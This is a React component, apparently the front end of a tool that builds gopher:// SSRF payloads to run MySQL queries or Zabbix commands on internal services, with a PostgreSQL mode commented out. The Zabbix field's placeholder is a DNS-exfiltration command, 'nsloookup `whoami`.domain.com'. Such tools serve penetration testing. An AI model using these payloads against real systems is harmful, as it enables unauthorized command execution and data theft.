import React, { useEffect } from "react";
import { Form, Input, Typography, message } from "antd";
import { useStore, GopherPayload } from "../store";
import Paragraph from "antd/es/typography/Paragraph";

const { Text } = Typography;

const FormRenderer: React.FC = () => {
	const payload = useStore((state) => state.payload);
	const setPayload = useStore((state) => state.setPayload);
	const username = useStore((state) => state.username);
	const setUsername = useStore((state) => state.setUsername);
	const query = useStore((state) => state.query);
	const setQuery = useStore((state) => state.setQuery);
	const gopherLink = useStore((state) => state.gopherLink);
	const generateMySQLGopherPayload = useStore(
		(state) => state.generateMySQLGopherPayload
	);
	const generateZabbixGopherPayload = useStore(
		(state) => state.generateZabbixGopherPayload
	);
	const generatePostgreSQLGopherPayload = useStore(
		(state) => state.generatePostgreSQLGopherPayload
	);
	const db = useStore((state) => state.db);
	const setDb = useStore((state) => state.setDb);

	useEffect(() => {
		if (payload === GopherPayload.MySQL) {
			generateMySQLGopherPayload(username, query);
		}
		if (payload === GopherPayload.Zabbix) {
			generateZabbixGopherPayload(query);
		}
		// if (payload === GopherPayload.PostgreSQL) {
		//   generatePostgreSQLGopherPayload(username, query, db);
		// }
	}, [
		payload,
		username,
		db,
		query,
		generateMySQLGopherPayload,
		generateZabbixGopherPayload,
		generatePostgreSQLGopherPayload,
	]);
	const handleUsernameChange = (event: React.ChangeEvent<HTMLInputElement>) => {
		setUsername(event.target.value);
	};

	const handleQueryChange = (event: React.ChangeEvent<HTMLInputElement>) => {
		setQuery(event.target.value);
	};

	const handleCopy = async () => {
		try {
			await navigator.clipboard.writeText(gopherLink);
			message.success("Copied to clipboard!");
		} catch (err) {
			message.error("Failed to copy text");
		}
	};

	switch (payload) {
		case GopherPayload.Zabbix:
			return (
				<Form>
					<Form.Item label="Command to execute">
						<Input
							placeholder="nsloookup `whoami`.domain.com"
							onChange={handleQueryChange}
							required
						/>
					</Form.Item>
					<Paragraph>
						<pre>
							<Text copyable={{ onCopy: handleCopy }}>{gopherLink}</Text>
						</pre>
					</Paragraph>
				</Form>
			);
		case GopherPayload.MySQL:
			return (
				<Form>
					<Form.Item label="MySQL Username">
						<Input
							placeholder="Enter username"
							value={username}
							onChange={handleUsernameChange}
							required
						/>
					</Form.Item>
					<Form.Item label="Query to execute">
						<Input
							placeholder="SELECT column FROM table;"
							value={query}
							onChange={handleQueryChange}
							required
						/>
					</Form.Item>
					<Paragraph>
						<pre>
							<Text copyable={{ onCopy: handleCopy }}>{gopherLink}</Text>
						</pre>
					</Paragraph>
				</Form>
			);

		// FIXME: Inconsistent PGSQL payload generation

		// case GopherPayload.PostgreSQL:
		//   return (
		//     <Form>
		//       <Form.Item label="PostgreSQL Username">
		//         <Input placeholder="Enter username" value={username} onChange={handleUsernameChange} required />
		//       </Form.Item>
		//       <Form.Item label="Database Name">
		//         <Input placeholder="Enter database name" value={db} onChange={(event: React.ChangeEvent<HTMLInputElement>) => setDb(event.target.value)} required />
		//       </Form.Item>
		//       <Form.Item label="Query to execute">
		//         <Input placeholder="SELECT column FROM table;" value={query} onChange={handleQueryChange} required />
		//       </Form.Item>
		//       <Paragraph copyable={{ onCopy: handleCopy }}>
		//         <pre>{gopherLink}</pre>
		//       </Paragraph>
		//     </Form>
		//   );

		// case GopherPayload.Custom:
		//   return (
		//     <Form>
		//       <Form.Item label="Raw tcp protocol message">
		//         <Input placeholder="Enter raw tcp protocol message" onChange={handleQueryChange} required />
		//       </Form.Item>
		//     </Form>
		// );
		default:
			return null;
	}
};

export default FormRenderer;
